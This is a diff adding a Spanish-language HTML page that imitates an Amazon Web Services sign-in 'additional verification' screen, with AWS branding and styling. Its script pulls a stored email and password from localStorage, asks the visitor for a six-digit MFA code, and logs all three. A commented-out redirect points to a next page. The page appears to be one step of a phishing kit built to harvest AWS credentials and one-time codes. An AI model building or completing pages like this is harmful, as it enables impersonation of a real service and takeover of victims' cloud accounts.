@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>AWS – Verificación adicional necesaria</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    body {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+      margin: 0;
+      background: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* Logo */
+    .aws-logo {
+      margin-top: 70px;
+      margin-bottom: 30px;
+    }
+
+    .aws-logo img {
+      height: 60px;
+    }
+
+    /* Tarjeta */
+    .mfa-card {
+      width: 430px;
+      border: 1px solid #d1d5db;
+      border-radius: 2px;
+      padding: 25px 30px 30px;
+      background: #fff;
+    }
+
+    h1 {
+      font-size: 17px;
+      font-weight: 600;
+      margin-bottom: 18px;
+    }
+
+    .label-small {
+      font-size: 13px;
+      margin-bottom: 6px;
+    }
+
+    .user-email {
+      font-size: 13px;
+      margin-bottom: 18px;
+      line-height: 1.4;
+    }
+
+    .user-email span {
+      color: #2563eb;
+      cursor: pointer;
+      font-size: 12px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      margin-bottom: 4px;
+      color: #374151;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 8px;
+      border: 1px solid #9ca3af;
+      border-radius: 2px;
+      margin-bottom: 18px;
+      font-size: 14px;
+    }
+
+    button {
+      width: 100%;
+      padding: 9px;
+      background: #f7981d;
+      color: #000;
+      border: none;
+      border-radius: 2px;
+      font-size: 14px;
+      cursor: pointer;
+      font-weight: 600;
+    }
+
+    button:hover {
+      background: #dd850d;
+    }
+
+    .mfa-help {
+      font-size: 13px;
+      margin-top: 18px;
+    }
+
+    .mfa-help a {
+      color: #2563eb;
+      text-decoration: none;
+    }
+
+    .mfa-help a:hover {
+      text-decoration: underline;
+    }
+
+    /* Decoración inferior */
+    .decor-bottom {
+      position: absolute;
+      bottom: 20px;
+      left: 0;
+      right: 0;
+      display: flex;
+      justify-content: space-between;
+      pointer-events: none;
+      padding: 0 40px;
+    }
+
+    .cube-group {
+      display: flex;
+      gap: 24px;
+      align-items: flex-end;
+    }
+
+    .cube {
+      border: 2px solid #d1d5f0;
+      width: 80px;
+      height: 80px;
+      border-radius: 4px;
+      position: relative;
+    }
+
+    .cube.small {
+      width: 60px;
+      height: 60px;
+    }
+
+    .cube.tall {
+      height: 110px;
+    }
+
+    .cube::before,
+    .cube::after {
+      content: "";
+      position: absolute;
+      border: 1px solid #e5e7f5;
+    }
+
+    .cube::before {
+      inset: 12px 6px auto 6px;
+      height: 0;
+      border-width: 1px 0 0 0;
+    }
+
+    .cube::after {
+      inset: 6px auto 6px 50%;
+      width: 0;
+      border-width: 0 0 0 1px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- LOGO -->
+  <div class="aws-logo">
+    <img src="aws-logo.png" alt="AWS">
+  </div>
+
+  <!-- TARJETA MFA -->
+  <div class="mfa-card">
+    
+    <h1>Verificación adicional necesaria</h1>
+
+    <p class="user-email">
+      Nombre de usuario: <br>
+      <strong id="email-value"></strong> <span>(¿No es usted?)</span>
+    </p>
+
+    <p class="label-small">
+      Introduzca el código de seis dígitos de la aplicación de autenticación.
+    </p>
+
+    <label>Código de MFA</label>
+    <input type="text" id="mfaCode" maxlength="6" placeholder="Ingresa el código">
+
+    <button id="mfaBtn">Iniciar sesión</button>
+
+    <p class="mfa-help">
+      <a href="#">Solución de problemas de MFA</a>
+    </p>
+
+  </div>
+
+  <!-- DECORACIÓN -->
+  <div class="decor-bottom">
+    <div class="cube-group">
+      <div class="cube tall"></div>
+      <div class="cube"></div>
+      <div class="cube small"></div>
+    </div>
+    <div class="cube-group">
+      <div class="cube small"></div>
+      <div class="cube tall"></div>
+      <div class="cube"></div>
+    </div>
+  </div>
+
+  <script>
+    // Obtener datos guardados
+    const email = localStorage.getItem("aws_email");
+    const password = localStorage.getItem("aws_password");
+
+    document.getElementById("email-value").textContent = email;
+
+    document.getElementById("mfaBtn").addEventListener("click", () => {
+      const code = document.getElementById("mfaCode").value;
+
+      console.log("Usuario:", email);
+      console.log("Contraseña:", password);
+      console.log("Código MFA:", code);
+
+      // window.location.href = "final.html";
+    });
+</script>
+
+
+</body>
+</html>
